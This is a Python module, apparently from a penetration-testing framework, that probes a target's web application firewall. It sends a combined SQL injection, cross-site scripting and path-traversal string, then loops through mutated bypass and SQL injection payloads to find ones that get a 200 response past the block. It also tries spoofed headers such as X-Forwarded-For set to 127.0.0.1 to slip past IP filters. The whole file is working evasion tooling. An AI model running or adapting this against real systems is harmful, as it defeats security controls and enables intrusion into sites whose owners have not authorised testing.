"""waf_evasion — test WAF bypass via encoding + payload mutation"""
from core.http import HttpClient
from core.payloads import get

class WafEvasion:
    def run(self, session, logger):
        http = HttpClient(session, logger)
        target = session.target

        # baseline: trigger WAF with raw attack
        attack = "' OR 1=1-- <script>alert(1)</script> ../../etc/passwd"
        r = http.get(target, params={"x": attack})
        base_block = r.status_code in (403, 406, 429, 501, 503) if r else None
        print(f"[waf_evasion] baseline: {r.status_code if r else 'no resp'} blocked={base_block}")
        logger.info("waf_baseline", code=r.status_code if r else None, blocked=base_block)

        # try mutations
        payloads = get("waf_bypass", mutate_by=2) + get("sqli", limit=30, mutate_by=2)
        bypasses = []
        for p in payloads:
            r = http.get(target, params={"x": p})
            if not r: continue
            if r.status_code == 200 and base_block:
                bypasses.append({"payload":p,"code":200})
                print(f"  [!] BYPASS: {p[:60]} -> 200")
                logger.finding("waf_bypass","high",f"{p[:80]}")
            if len(bypasses) > 15: break

        # header tricks for IP-based filters
        header_bypass = []
        for h in ["X-Forwarded-For","X-Real-IP","X-Originating-IP","X-Remote-Addr",
                  "X-Client-IP","X-Host","X-Forwarded-Host","X-Original-URL","X-Rewrite-URL"]:
            r = http.get(target, headers={h:"127.0.0.1"})
            if r and r.status_code == 200:
                header_bypass.append(h)
                logger.finding("header_bypass","low",h)

        print(f"[waf_evasion] {len(bypasses)} payload bypasses, {len(header_bypass)} header tricks")
        return {"blocked": base_block, "bypasses": bypasses, "header_tricks": header_bypass}
